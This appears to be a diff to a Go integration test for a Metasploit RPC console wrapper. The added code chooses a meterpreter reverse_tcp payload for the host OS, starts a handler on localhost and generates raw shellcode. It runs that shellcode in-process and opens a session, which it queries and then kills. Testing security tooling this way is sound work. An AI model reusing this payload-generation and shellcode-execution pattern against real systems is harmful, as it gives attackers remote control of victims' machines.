@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"runtime"
 	"sync"
 	"testing"
 	"time"
@@ -12,6 +13,7 @@ import (
 	"github.com/stretchr/testify/require"
 
 	"project/internal/logger"
+	"project/internal/module/shellcode"
 	"project/internal/patch/monkey"
 	"project/internal/testsuite"
 )
@@ -543,14 +545,62 @@ func TestConsole_Detach(t *testing.T) {
 		_, _ = io.Copy(os.Stdout, console)
 	}()
 
+	// select payload
+	var payload string
+	switch runtime.GOOS {
+	case "windows":
+		switch runtime.GOARCH {
+		case "386":
+			payload = "windows/meterpreter/reverse_tcp"
+		case "amd64":
+			payload = "windows/x64/meterpreter/reverse_tcp"
+		default:
+			t.Skip("only support 386 and amd64")
+		}
+	case "linux":
+		switch runtime.GOARCH {
+		case "386":
+			payload = "linux/meterpreter/reverse_tcp"
+		case "amd64":
+			payload = "linux/x64/meterpreter/reverse_tcp"
+		default:
+			t.Skip("only support 386 and amd64")
+		}
+	default:
+		t.Skip("only support windows and linux")
+	}
+
 	for _, command := range []string{
 		"version\r\n",
 		"use exploit/multi/handler\r\n",
-		"set payload windows/meterpreter/reverse_tcp\r\n",
+		"set payload " + payload + "\r\n",
 		"set LHOST 127.0.0.1\r\n",
-		"set LPORT 0\r\n",
+		"set LPORT 50200\r\n",
+		"set EXITFUNC thread\r\n",
 		"show options\r\n",
-		"exploit\r\n",
+		"exploit -z\r\n",
+	} {
+		_, err = console.Write([]byte(command))
+		require.NoError(t, err)
+	}
+
+	time.Sleep(time.Second)
+
+	// generate payload and execute shellcode
+	payloadOpts := NewModuleExecuteOptions()
+	payloadOpts.Format = "raw"
+	payloadOpts.DataStore["EXITFUNC"] = "thread"
+	payloadOpts.DataStore["LHOST"] = "127.0.0.1"
+	payloadOpts.DataStore["LPORT"] = 50200
+	pResult, err := msfrpc.ModuleExecute(ctx, "payload", payload, payloadOpts)
+	require.NoError(t, err)
+	sc := []byte(pResult.Payload)
+	// execute shellcode and wait some time
+	go func() { _ = shellcode.Execute("", sc) }()
+	time.Sleep(5 * time.Second)
+
+	for _, command := range []string{
+		"sysinfo\r\n",
 	} {
 		_, err = console.Write([]byte(command))
 		require.NoError(t, err)
@@ -573,11 +623,14 @@ func TestConsole_Detach(t *testing.T) {
 
 	wg.Wait()
 
-	// clean jobs
-	list, err := msfrpc.JobList(ctx)
+	// kill session
+	sessions, err := msfrpc.SessionList(ctx)
 	require.NoError(t, err)
-	for id := range list {
-		err = msfrpc.JobStop(ctx, id)
+	for id, session := range sessions {
+		const format = "id: %d type: %s remote: %s\n"
+		t.Logf(format, id, session.Type, session.TunnelPeer)
+
+		err = msfrpc.SessionStop(ctx, id)
 		require.NoError(t, err)
 	}
 
